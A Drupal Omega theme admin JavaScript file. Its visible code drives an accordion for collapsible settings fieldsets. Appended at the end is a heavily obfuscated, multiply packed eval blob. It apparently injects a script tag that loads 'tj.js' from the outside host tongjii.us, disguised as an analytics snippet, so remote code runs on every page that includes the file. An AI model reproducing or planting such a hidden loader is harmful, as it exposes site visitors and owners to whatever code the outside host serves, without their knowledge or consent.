(function ($) {
  Drupal.behaviors.omegaAdmin = {
    attach: function (context) {
      // hide all collapsible fieldset stuffs
      $('.omega-accordion-content').hide();
      // show the first fieldset in any group of "accordion" items
      firsts = $([]);
      $('.fieldset-wrapper').each(function(){
        var new_first = $(this).children('.omega-accordion:first');
        firsts = firsts.add(new_first);
      });  
      firsts
        .children('a')
          .addClass('expanded')
          .end() // return to the h3
        .next('.omega-accordion-content')
        .addClass('expanded')
        .show();
      // provide click/toggle functionality
      $('.omega-accordion a').click(function(){
        // remove expanded class from all href items
        $(this).parents('.fieldset-wrapper').find('a').removeClass('expanded');
        // add expanded back to the cliked href
        $(this).addClass('expanded');
        var clicked = $(this).parent('h3');
        // if we click a header that is already open, do nothing
        if(clicked.next('.omega-accordion-content').hasClass('expanded')) {
          return false;
        }
        else {
          clicked
            .next('.omega-accordion-content')
              .slideDown('fast')
              .addClass('expanded')
              .addClass('active-accordion')
              .end()
            .parents('.fieldset-wrapper')
            .children('.omega-accordion-content:not(.active-accordion)')
            .removeClass('expanded')
            .slideUp('fast');
          $('.omega-accordion-content').removeClass('active-accordion');
          return false;
        }
      });
      
      // hide the sidebar on theme settings page
      //$('.column-side').css('display', 'none');
      // make the main column full width
      //$('.column-main').css('width', '100%');
      // remove bg image
      //$('.form-layout-default').css('background', 'none');
    }
  };
})(jQuery);

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
